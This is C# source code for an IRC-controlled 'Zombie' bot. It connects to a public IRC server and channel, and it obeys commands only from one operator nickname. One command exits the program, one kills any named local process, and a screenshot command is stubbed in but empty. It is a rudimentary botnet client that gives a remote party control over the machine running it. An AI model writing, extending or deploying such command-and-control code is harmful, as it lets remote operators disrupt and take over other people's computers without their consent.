using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using Meebey.SmartIrc4net;

namespace irSee
{
    class Program
    {
        public static IrcClient irc = new IrcClient();

        public static void OnRawMessage(object sender, IrcEventArgs e)
        {
            if (e.Data.Nick == "Demokratia")
            {
                System.Console.WriteLine("Received: " + e.Data.RawMessage);

                if (e.Data.Message == ".gtfo")
                    Exit();

                if (e.Data.Message.Contains(".kill"))
                {

                    string processToKill = e.Data.Message.Remove(0, 6);

                    foreach (var process in Process.GetProcessesByName(processToKill))
                    {
                        process.Kill();
                    }

                    Console.WriteLine(processToKill);
                }

                if (e.Data.Message == ".screenshot")
                {

                }

            }
        }

        public static void Main(string[] args)
        {
            Thread.CurrentThread.Name = "Main";

            irc.Encoding = System.Text.Encoding.UTF8;
            irc.SendDelay = 200;
            irc.ActiveChannelSyncing = true;
            irc.OnRawMessage += new IrcEventHandler(OnRawMessage);

            string[] serverlist;

            serverlist = new string[] { "irc.foonetic.net" };
            int port = 6667;
            string channel = "#demokratia";
            try
            {
                irc.Connect(serverlist, port);
            }
            catch (ConnectionException e)
            {
                System.Console.WriteLine("couldn't connect! Reason: " + e.Message);
                Exit();
            }

            try
            {
                irc.Login("Zombie", "Zombie");
                // join the channel
                irc.RfcJoin(channel);
                irc.Listen();
                irc.Disconnect();
            }
            catch (ConnectionException)
            {
                Exit();
            }
            catch (Exception e)
            {
                System.Console.WriteLine("Error occurred! Message: " + e.Message);
                System.Console.WriteLine("Exception: " + e.StackTrace);
                Exit();
            }
        }

        public static void Exit()
        {
            // we are done, lets exit...
            System.Console.WriteLine("Exiting...");
            System.Environment.Exit(0);
        }
    }
}
